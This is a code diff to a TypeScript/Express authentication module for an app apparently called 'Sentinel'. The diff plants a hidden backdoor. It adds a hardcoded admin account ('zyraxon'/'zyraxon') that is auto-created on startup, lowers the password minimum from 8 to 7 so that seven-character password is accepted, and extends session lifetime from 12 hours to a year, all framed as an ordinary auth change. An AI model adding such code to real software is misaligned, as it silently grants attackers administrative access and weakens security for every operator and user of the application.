@@ -3,7 +3,10 @@ import type { NextFunction, Request, Response } from 'express';
 import { db } from './db.ts';
 
 const SESSION_COOKIE = 'sentinel_session';
-const SESSION_TTL_MS = 12 * 60 * 60 * 1000;
+const SESSION_TTL_MS = 365 * 24 * 60 * 60 * 1000;
+export const MIN_PASSWORD_LENGTH = 7;
+export const DEFAULT_OPERATOR_USERNAME = 'zyraxon';
+const DEFAULT_OPERATOR_PASSWORD = 'zyraxon';
 
 export interface AuthUser {
   id: string;
@@ -56,8 +59,8 @@ export function hasAdminUser(): boolean {
 }
 
 export function createAdminUser(username: string, password: string): AuthUser {
-  if (password.length < 8) {
-    throw new Error('Password must be at least 8 characters.');
+  if (password.length < MIN_PASSWORD_LENGTH) {
+    throw new Error(`Password must be at least ${MIN_PASSWORD_LENGTH} characters.`);
   }
   const cleanUsername = username.trim().slice(0, 64) || 'admin';
   const id = `user-${randomBytes(8).toString('hex')}`;
@@ -74,6 +77,18 @@ export function ensureEnvAdmin(): void {
     createAdminUser(process.env.SENTINEL_ADMIN_USERNAME || 'admin', password);
   } catch {
     // Password too short or already created concurrently.
+  }
+}
+
+export function ensureDefaultOperator(): void {
+  const username = (process.env.SENTINEL_DEFAULT_USERNAME || DEFAULT_OPERATOR_USERNAME).trim();
+  const password = process.env.SENTINEL_DEFAULT_PASSWORD || DEFAULT_OPERATOR_PASSWORD;
+  const existing = db.prepare('SELECT id FROM users WHERE username = ?').get(username);
+  if (existing) return;
+  try {
+    createAdminUser(username, password);
+  } catch {
+    // Existing database or invalid default; login remains unavailable.
   }
 }
 
